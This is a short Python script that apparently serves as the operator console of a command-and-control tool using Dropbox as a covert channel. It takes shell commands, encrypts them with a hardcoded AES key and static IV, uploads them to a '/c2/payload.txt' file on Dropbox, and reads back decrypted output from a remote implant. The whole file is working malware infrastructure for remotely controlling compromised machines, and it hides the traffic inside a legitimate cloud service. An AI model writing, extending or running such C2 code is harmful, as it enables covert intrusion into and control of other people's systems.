import dropbox
import dropbox.files 
import os
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message.encode(), AES.block_size))
    iv = cipher.iv
    return ct_bytes

def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()

def write_cmd():
    command = input('$ ')
    command = encrypt_message(command)
    #file_data = command.encode()

    #print(file_data)
    try:
        dbx.files_upload(command, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        print("[+] Command written to Dropbox Server")
        time.sleep(10)
        read_output()
    except dropbox.exceptions.ApiError as err:
        print(f"Error while overwriting file: {err}")
    
    
def read_output():
    _, response = dbx.files_download(dropbox_path)
    command = response.content
    command = decrypt_message(command)
    print('[+] Successfully read output from Dropbox Server')
    print(f'output->{command}')
    


if __name__ == '__main__':
    key = "564cybereffectss".encode()
    CONST_IV = 'qwertyuiopasdfgh'.encode()

    # dropbox init
    with open("token.txt", "r") as f:
        token = f.read()

    dbx = dropbox.Dropbox(token)
    dropbox_path = '/c2/payload.txt'

    # start payload execution
    while True:
        write_cmd()






